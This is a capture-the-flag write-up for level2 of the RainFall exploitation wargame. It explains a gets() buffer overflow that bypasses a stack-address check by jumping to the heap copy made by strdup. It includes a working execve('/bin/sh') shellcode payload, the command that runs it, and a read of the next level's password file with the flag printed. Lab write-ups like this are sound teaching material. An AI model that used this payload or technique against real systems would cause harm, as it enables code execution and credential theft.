On this level, we got a binary quite similar to the one from level1.
The execution of this binary waits for an input and print the input before leaving.
Let's analyze the binary with Ghidra and get the decompiled code, to see more of it.

We got two functions: the **main()** and **p()**.
We can see there is a call of *gets* in **p()** and as we know from the previous level, we can use it to do a buffer overflow attack.
However, there is no syscall of /bin/sh, so no function to open a shell. But that's not a problem, because we can inject shellcode.

We have to be careful, because in **p()**, we have this line :

`  if ((unaff_retaddr & 0xb0000000) == 0xb0000000)`

It checks if the return address (unaff_retaddr) starts with "0xb...". In Linux, addresses that starts with "0xb" are located into the Stack.
So, if we try to execute code inside the buffer on the stack, the program shall detect it and stops (_exit(1);).
This avoids to get a shellcode stored on the stack.

But we can see in **p()**, that there is a call for *strdup* to take the input and do a copy of it, and to this copy, it uses *malloc* which stores datas into another memory area: the **Heap**
And the Heap has no address that start with "0xb" so the "if" check is totally ignored, we can see that using ltrace:

```zsh
ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                            = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)                 = 0xbffff6fc
puts("")                                                      = 1
strdup("")                                                    = 0x0804a008
+++ exited (status 8) +++
```

"0x0804a008" is the address returned by *strdup*, so this is where our injected shell shall be copied.

The buffer "local_50 [76]" has a size of 76 bytes, but we also need to overwrite the saved address EBP of **main** to get the return address (our jump address), so we need to add 4 bytes, and only at the 81st, we can start write the return address, the EIP (0x0804a008). And on these 80 bytes, we also need to use some of them for the shellcode (found on a shellcode database), which shall executes the shell we need. We search a shellcode to execute execve(/bin/sh).
The command would be :

```zsh
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "F" * 59 + "\x08\xa0\x04\x08"' > /tmp/test
level2@RainFall:~$ cat /tmp/test - | ./level2
j
 X�Rh//shh/bin��1�̀FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF�

cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

P.S.: To explain some terms:

-	EBP (Base pointer): A fixed reference pointer which marks the start of the area of the actual function, it's with this pointer that the program knows where are his locals variables, for instance.
-	ESP (Stack pointer): A dynamic pointer who moves everytime when we add or remove datas
-	EIP (Instruction pointer): A return address, in our context where the CPU jumps to execute the next command.
